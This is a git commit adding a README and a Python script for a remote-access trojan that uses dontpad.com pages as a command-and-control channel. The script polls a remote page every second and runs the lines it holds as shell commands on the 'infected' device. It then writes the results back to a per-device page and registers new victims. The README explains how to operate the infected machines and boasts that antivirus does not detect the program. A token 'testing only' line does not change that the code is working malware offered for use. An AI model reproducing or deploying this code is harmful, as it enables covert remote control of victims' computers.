2d9e570d26398f51f1d3c0d0c4ee42e82087b2a0
Maximus Milazzo <maximusmilazzo@yahoo.com>
2021-05-19 16:54:31 -0700

    hi

---
+++ README.txt
@@ -0,0 +1,66 @@
+This program allows for remote access using the wesite dontpad.com
+
+Create two dontpad.com links, and insert them into the code.  The first link is for code execution, and needs to be setup.  The other does not.
+The code should be written in Bash (or whatever the command line language is native to the infected systems).
+Setup the first link as follows:
+--------------------------------
+*!
+#:#
+<write code here>
+--------------------------------
+
+The "!" symbol can be replaced with any character, and the "#" symbol must be replaced with a number.
+The first number on the second line signals how many times the program should loop, and the second number denotes wait time between loops.
+The second line can be kept blank, and the code will run only once.  Do not write any code on this line, however.
+
+To execute code, replace whatever symbol is present in the "!" location.  It may take a few seconds for any active devices to detect this change, but the code will run.
+Make sure to keep the asterix present before this character on the first line, and don't type multiple characters after it.
+
+After a device has been infected with the program, it will alter the contents of the second link.
+You can add a title to the second link as well and it will not be affected.
+For example, the second link page may look as follows:
+--------------------------------
+ACTIVE SYSTEM LINKS:
+
+http://dontpad.com/12pI91h10v1453E4r9MvM90aoCI5fg
+http://dontpad.com/relCr9zl934S4bhjdjKTO56wne8vHb
+--------------------------------
+
+Each infected device will have a unique system ID that will correspond to a donpad.com link.
+These links (accessible via the second link page) will show the results of the last code execution attempt recieved on that device.
+Altering the contents of these pages has no effect on the program.
+
+You can also deactivate certain devices from receiving code by placing a "%" symbol before its link on the second link page.
+For example, if you had seven active system links like this:
+--------------------------------
+ACTIVE SYSTEM LINKS:
+
+http://dontpad.com/12pI91h10v1453E4r9MvM90aoCI5fg
+http://dontpad.com/relCr9zl934S4bhjdjKTO56wne8vHb
+http://dontpad.com/B7Is373RpGcV4OmFae1DFBY96d9Oeh
+http://dontpad.com/7tZ3E0dFJLGlqL3U048MX5pPb3wKCv
+http://dontpad.com/2wXIEwHGNgeZjUIgehPKTiU0RsLtAF
+http://dontpad.com/qrM4k78MqTWcDUTZ7x86J0l4VKINhX
+http://dontpad.com/dlRKjbr9VTB13bLcNoVjcavyJnquYX
+--------------------------------
+
+You can rearrange the links as you like and insert an "%" symbol:
+--------------------------------
+ACTIVE SYSTEM LINKS:
+
+http://dontpad.com/dlRKjbr9VTB13bLcNoVjcavyJnquYX
+http://dontpad.com/12pI91h10v1453E4r9MvM90aoCI5fg
+http://dontpad.com/7tZ3E0dFJLGlqL3U048MX5pPb3wKCv
+http://dontpad.com/relCr9zl934S4bhjdjKTO56wne8vHb
+%
+http://dontpad.com/B7Is373RpGcV4OmFae1DFBY96d9Oeh
+http://dontpad.com/2wXIEwHGNgeZjUIgehPKTiU0RsLtAF
+http://dontpad.com/qrM4k78MqTWcDUTZ7x86J0l4VKINhX
+--------------------------------
+
+All the systems associated with the links below the "%" symbol will no longer run.
+To re-enable them, simply remove the "%" symbol, and run the code like normal.
+
+As of now, no antivirus services have been able to detect this program as malicious...
+HOWEVER... no one likes getting infected with malware on their computer so please use this program for testing purposes only.
+Thank you :)
---
+++ Source/exec-py.py
@@ -0,0 +1,153 @@
+import urllib.request as request
+import urllib.parse as parse
+import json
+import subprocess
+import time
+import random
+import string
+# imports needed packages
+
+
+MAIN_URL = "http://dontpad.com/"
+CODE_PAGE_EXTENSION = "INSERT_LINK"
+INFO_PAGE_EXTENSION = "INSERT_LINK"
+# defines URL for online text file access and sub-URL's
+
+
+def write(page, content):  # writes to online text file
+	url = MAIN_URL + page
+	data = parse.urlencode({"text" : content})
+	data = data.encode("utf-8")
+	req = request.Request(url, data)
+
+	with request.urlopen(req) as response:
+		timestamp = response.read()
+
+	return timestamp
+
+
+def read_raw(page):  # reads raw online text file
+	with request.urlopen(MAIN_URL + page + ".body.json?lastUpdate=0") as response:
+		resp = response.read()
+
+	return resp
+
+
+def read(page, full_json=False):  # reads online text file
+	content = json.loads(read_raw(page).decode())
+
+	if "body" in content:
+		return content["body"] if not full_json else content
+
+	return ""
+
+
+def exec_code(code):  # executes code recieved from online text file
+    try:
+        code_lines = code.split("\n")
+
+        try:  # manages/creates data storage file
+            f = open("codelines.txt", "r")
+            current_header = f.read()
+            f.close()
+        except:
+            f = open("codelines.txt", "w")
+            current_header = ""
+            f.close()
+        
+        if code_lines[0] != current_header and code_lines[0] != "*":  # checks conditions for running remote code
+
+            if code_lines[1] == "":
+                loop_num = 1
+                wait_time = 0
+            elif ":" in code_lines[1]:
+                try:
+                    time_vals = code_lines[1].split(":")
+                    loop_num = int(time_vals[0])
+                    wait_time = int(time_vals[1])
+                except Exception as e:
+                    write(system_id, "!!! FORMATTING ERROR !!!\n\nEXCEPTION CODE:\n" + str(e))
+                    return
+                
+                if loop_num < 1 or wait_time < 0:
+                    write(system_id, "!!! FORMATTING ERROR !!!\n\nLOOP VALUES TOO LOW\n")
+                    return
+            else:
+                write(system_id, "!!! FORMATTING ERROR !!!\n\nUSE:\nloop_num:wait_time")
+                return
+
+            f = open("codelines.txt", "w")
+            f.write(code_lines[0])
+            f.close()
+            
+            code_lines = code_lines[2:]
+            
+            for x in range(loop_num):  # loops through remote code however many times specified (once if not)
+                exec_status = "CODE EXECUTION STATUS\n----------------------------------------\nLOOP " + str(x + 1) +" of " + str(loop_num) + "\n\n"
+
+                for line in code_lines:
+                    output = subprocess.call(line, shell=True)
+                    exec_status += line
+
+                    if output == 0:
+                        exec_status += " ===> RUN SUCCESSFULLY\n"
+                    else:
+                        exec_status += " ===> ERROR (code " + str(output) + ")\n"
+
+                write(system_id, exec_status)
+                time.sleep(wait_time)
+                
+    except Exception as e:
+        write(system_id, "!!! EXECUTION FAILURE !!!\n\nCODE COULD NOT BE EXECUTED\n\n(Failure Code: " + str(e) + ")")
+        return
+
+
+def write_info():  # writes link information to the main information page
+    current_info_page = read(INFO_PAGE_EXTENSION)
+    current_info_page += "\n" + MAIN_URL + system_id
+    write(INFO_PAGE_EXTENSION, current_info_page)
+
+
+def disable_first_execution():
+    code = read(CODE_PAGE_EXTENSION)
+
+    try:
+        code_lines = code.split("\n")
+
+        f = open("codelines.txt", "w")
+        f.write(code_lines[0])
+        f.close()
+    except:
+        pass    
+
+
+try:  # creates or retrieves system ID
+    f = open("system-id.txt", "r")
+    system_id = f.read()
+    f.close()
+except:
+    f = open("system-id.txt", "w")
+    system_id = ''.join(random.choices(string.ascii_letters + string.digits, k=30))
+    f.write(system_id)
+    f.close()
+
+    write_info()
+    disable_first_execution()
+
+
+while True:  # checks for updates on online text file exery second
+    code = read(CODE_PAGE_EXTENSION)
+
+    found_ids = read(INFO_PAGE_EXTENSION).split("\n")
+
+    if MAIN_URL + system_id not in found_ids:
+        write_info()
+
+    for id in found_ids:  # runs code if correct conditions met
+        if id == "%":
+            disable_first_execution()        
+            break
+        elif MAIN_URL + system_id == id:
+            exec_code(code)
+
+    time.sleep(1)
